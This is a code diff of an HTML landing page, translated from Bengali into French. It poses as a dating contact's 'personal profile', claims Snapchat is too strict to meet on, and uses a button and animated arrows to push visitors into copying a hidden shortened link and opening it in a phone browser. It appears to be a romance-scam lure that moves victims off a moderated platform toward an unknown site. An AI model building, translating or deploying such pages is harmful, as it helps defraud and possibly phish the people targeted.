@@ -1,73 +1,104 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ল্যান্ডিং পেজ</title>
-    <style>
-        body {
-            background-color: #1a1a1a;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-        .browsers {
-            margin: 20px 0;
-        }
-        .browsers img {
-            width: 50px;
-            margin: 10px;
-        }
-        .copy-btn {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-        .copy-btn:hover {
-            background-color: #45a049;
-        }
-        .footer {
-            margin-top: 40px;
-            font-size: 14px;
-            color: #aaa;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>profil personnel</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .browsers {
+            margin: 20px 0;
+        }
+        .browsers img {
+            width: 50px;
+            margin: 10px;
+        }
+        .gif-static {
+            width: 200px;
+            margin: 20px 0;
+            border-radius: 12px;
+        }
+        .gif-changing img {
+            width: 200px;
+            margin: 20px 0;
+            border-radius: 12px;
+        }
+        .copy-btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .copy-btn:hover {
+            background-color: #45a049;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #aaa;
+        }
+    </style>
 </head>
 <body>
 
-    <h2>ওয়েলকাম টু মাই পার্সোনাল প্রোফাইল</h2>
-    <p>আমি মনে করি এখানে আমাদের দেখা করা সেফ না যেহেতু আমরা ডেটিং এ যাচ্ছি<br>
-    স্ন্যাপ চ্যাট এ বিষয়ে খুবই সতর্ক।<br>
-    নিচে <b>কপি নাও</b> বাটনে ক্লিক করে আমার এড্রেসটি কপি করে আপনার ফোনে থাকা যেকোনো ব্রাউজারে পেস্ট করুন এবং আমাকে খুঁজে পান।</p>
+    <h2>Bienvenue sur mon profil personnel</h2>
 
-    <div class="browsers">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Microsoft_Edge_logo_%282019%29.svg" alt="Edge">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Google_Chrome_icon_%282011%29.png" alt="Chrome">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/52/Safari_browser_logo.svg" alt="Safari">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4c/Opera_2015_icon.svg" alt="Opera">
-    </div>
+    <!-- ওয়েলকাম টেক্সটের নিচে একটি স্থির GIF -->
+    <img src="https://i.postimg.cc/zvvfSRfG/lv-0-20250720190333.gif" alt="GIF Fixe" class="gif-static">
 
-    <button class="copy-btn" onclick="copyText()">কপি নাও</button>
+    <p>Je pense qu'il n'est pas sûr de nous rencontrer ici, car nous allons sortir ensemble.<br>
+    Snapchat est très strict à ce sujet.<br>
+    Cliquez sur le bouton <b>Copier maintenant</b> ci-dessous pour copier mon adresse, collez-la dans n'importe quel navigateur sur votre téléphone et trouvez-moi.</p>
 
-    <p class="footer">আপনি যেকোনো ব্রাউজার ব্যবহার করতে পারেন</p>
+    <div class="browsers">
+        <img src="https://i.postimg.cc/G2CZP0q7/Mozilla-Firefox-logo-2013.png" alt="Firefox">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Google_Chrome_icon_%282011%29.png" alt="Chrome">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/52/Safari_browser_logo.svg" alt="Safari">
+        <img src="https://i.postimg.cc/mgxnQfdv/Opera-2015-icon-svg.png" alt="Opera">
+    </div>
 
-    <script>
-        function copyText() {
-            const textToCopy = "https://shorturl.at/uVfTK";
-            const tempInput = document.createElement("input");
-            tempInput.value = textToCopy;
-            document.body.appendChild(tempInput);
-            tempInput.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempInput);
-            alert("লিংক কপি হয়েছে! এখন আপনার ব্রাউজারে পেস্ট করুন।");
-        }
-    </script>
+    <!-- কপি বাটনের ঠিক ওপরে পরিবর্তনশীল তিনটি GIF -->
+    <div class="gif-changing">
+        <img src="GIF_1_URL_HERE" id="gifChanger" alt="GIF Changeant">
+    </div>
+
+    <button class="copy-btn" onclick="copyText()">Copier maintenant</button>
+
+    <p class="footer">Vous pouvez utiliser n'importe quel navigateur</p>
+
+    <script>
+        function copyText() {
+            const textToCopy = "https://shorturl.at/uVfTK";
+            const tempInput = document.createElement("input");
+            tempInput.value = textToCopy;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+            alert("Lien copié ! Collez-le maintenant dans votre navigateur.");
+        }
+
+        // তিনটি GIF পর্যায়ক্রমে পরিবর্তনের কোড
+        const gifList = [
+            "https://i.postimg.cc/wTYKkpPX/00-28-27-444-512.gif",
+            "https://i.postimg.cc/bNpCJNWB/Red-animated-arrow-down.gif",
+            "https://i.postimg.cc/wTYKkpPX/00-28-27-444-512.gif"
+        ];
+        let currentIndex = 0;
+        setInterval(() => {
+            currentIndex = (currentIndex + 1) % gifList.length;
+            document.getElementById('gifChanger').src = gifList[currentIndex];
+        }, 3000); // ৩ সেকেন্ড পরপর পরিবর্তন হবে
+    </script>
 
 </body>
 </html>
